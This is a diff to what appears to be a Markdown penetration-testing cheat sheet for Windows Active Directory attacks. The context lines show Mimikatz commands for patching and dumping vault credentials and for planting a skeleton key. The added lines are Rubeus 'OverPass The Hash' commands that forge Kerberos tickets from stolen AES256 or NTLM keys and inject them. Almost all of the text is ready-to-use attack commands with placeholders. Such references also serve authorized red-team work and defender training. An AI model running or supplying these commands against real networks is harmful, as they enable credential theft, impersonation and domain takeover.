@@ -104,3 +104,11 @@ C:> Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 ```powershell
 C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <hostname_full_FQDN>
 ```
+### Rubeus
+---
+##### OverPass The Hash
+```powershell
+C:> Rubeus.exe asktgt /user:<username> /aes256:<aes256_key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+C:> Rubeus.exe asktgt /user:<username> /ntlm:<ntlm_rc4_key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+```
